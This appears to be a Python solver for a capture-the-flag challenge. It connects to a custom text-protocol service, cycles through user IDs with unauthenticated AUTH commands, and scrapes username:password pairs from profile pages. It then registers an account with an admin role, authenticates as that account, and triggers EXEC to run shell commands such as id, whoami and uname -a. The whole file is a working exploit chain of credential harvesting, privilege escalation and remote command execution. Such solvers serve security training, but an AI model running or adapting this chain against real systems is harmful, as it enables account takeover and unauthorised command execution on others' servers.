#!/usr/bin/env python3
import os
import socket
import time
import re


def recv_all(sock: socket.socket, timeout: float = 0.5) -> bytes:
    sock.settimeout(timeout)
    chunks = []
    try:
        while True:
            data = sock.recv(65535)
            if not data:
                break
            chunks.append(data)
            if len(data) < 65535:
                break
    except Exception:
        pass
    return b"".join(chunks)


def send_line(sock: socket.socket, line: str, delay: float = 0.2) -> bytes:
    if not line.endswith("\n"):
        line += "\n"
    sock.sendall(line.encode())
    time.sleep(delay)
    return recv_all(sock, 0.8)


def main() -> None:
    # Resolver IP/PORT
    ip = None
    port = None
    env_path = "/workspace/challenges/khp_instance.env"
    with open(env_path, "r", encoding="utf-8") as f:
        for line in f:
            if line.startswith("IP="):
                ip = line.strip().split("=", 1)[1]
            elif line.startswith("PORT="):
                try:
                    port = int(line.strip().split("=", 1)[1])
                except Exception:
                    pass
    if not ip or not port:
        raise SystemExit("Falta IP/PORT")

    with socket.create_connection((ip, port), timeout=5) as s:
        _ = recv_all(s, 0.3)
        # 1
        send_line(s, "RLDB")
        # 2..11 AUTH, 12..21 GTPR
        for i in range(1, 11):
            send_line(s, f"AUTH {i}")
            page = send_line(s, "GTPR").decode("utf-8", errors="ignore")
            m = re.search(r"User:\s*(\S+):(\S+)", page)
            if not m:
                m = re.search(r"Profile:\s*(\S+):(\S+)", page)
            if m:
                print(f"ID {i}: {m.group(1)}:{m.group(2)}")
        # 22 REKE admin try (ephemeral)
        reg = send_line(s, "REKE tmpadmin:admin")
        rid = 1
        m = re.search(rb"ID->(\d+)", reg)
        if m:
            rid = int(m.group(1))
        # 23 AUTH rid
        send_line(s, f"AUTH {rid}")
        # 24 EXEC
        exec_out = send_line(s, "EXEC").decode("utf-8", errors="ignore")
        print(exec_out)
        # 25..29 comandos básicos
        for cmd in ["id", "whoami", "uname -a", "pwd", "ls -la"]:
            s.sendall((cmd + "\n").encode())
            time.sleep(0.5)
            data = recv_all(s, 0.8)
            try:
                print(data.decode("utf-8", errors="ignore"))
            except Exception:
                print(repr(data))
        # 30 exit
        s.sendall(b"exit\n")


if __name__ == "__main__":
    main()

